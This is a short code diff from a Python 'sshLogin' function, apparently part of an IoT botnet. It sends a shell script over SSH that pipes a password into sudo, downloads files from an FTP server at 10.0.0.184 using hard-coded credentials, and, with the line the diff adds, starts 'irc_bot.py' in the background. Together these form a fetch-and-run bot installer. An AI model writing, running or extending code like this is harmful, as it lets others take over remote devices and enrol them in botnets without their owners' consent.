@@ -40,6 +40,7 @@ def sshLogin(user, ip, password):
         echo ''' + password + '''| sudo -S mkdir IotBot
         cd IotBot
         echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
+        python3 irc_bot.py &
         ls
         exit
         '''
